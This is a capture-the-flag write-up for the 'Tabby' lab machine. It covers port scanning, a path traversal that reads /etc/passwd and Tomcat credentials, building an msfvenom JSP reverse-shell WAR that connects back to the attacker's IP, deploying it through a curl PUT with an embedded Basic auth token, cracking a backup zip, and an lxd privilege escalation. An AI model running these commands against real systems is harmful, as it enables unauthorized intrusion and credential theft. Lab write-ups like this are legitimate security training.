# Tabby

## Enumeration

### Scan Report

```text
Host is up (0.18s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http      Apache httpd 2.4.41 ((Ubuntu))
5225/tcp filtered hp-server
8080/tcp open     http      Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



### LFI Vulnerability

[http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) seems vulnerable to LFI. Attempting to gain some more information.

[http://megahosting.htb/news.php?file=../../../../../etc/passwd](http://megahosting.htb/news.php?file=../../../../../etc/passwd)

```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
```

We can check for users here. Found one other user other than root: **ASH**

**Browsing to 8080 gives us information about tomcat-users.xml**

URL: /news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml

This will read the file. Location was fetched after isntalling tomcat and then searching for tomcat-users.xml

## Exploitation

reading the file we get to know we have access to manager-script. This gives us access to deploy using HTTP Requests.

### **Create Shell**

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=9000 -f war > shell2.war  
```

### **Upload Shell**

```text
curl -H "Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==" --upload-file shell2.war --request PUT "http://megahosting.htb:8080/manager/text/deploy?path=/docs3&update=true"
```

Browse to the endpoint to get a reverse shell using netcat

### Post Exploitation

Run linpeas.

 We will find a backup file.

```text
http://megahosting.htb/files/16162020_backup.zip
```

Download it and crack using frackzip

### Fcrackzip

```text
 fcrackzip -D -p ../../tools/rockyou.txt backup.zip 
```

### Investigate the files

Nothing interesting found. Where else can we use tha password..

### ASH

run "su ash" and enter the password of the backup file. Viola!





### **Escalating to root**

We can see lxd group in user and groups in linpeas.

{% page-ref page="../../../linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md" %}



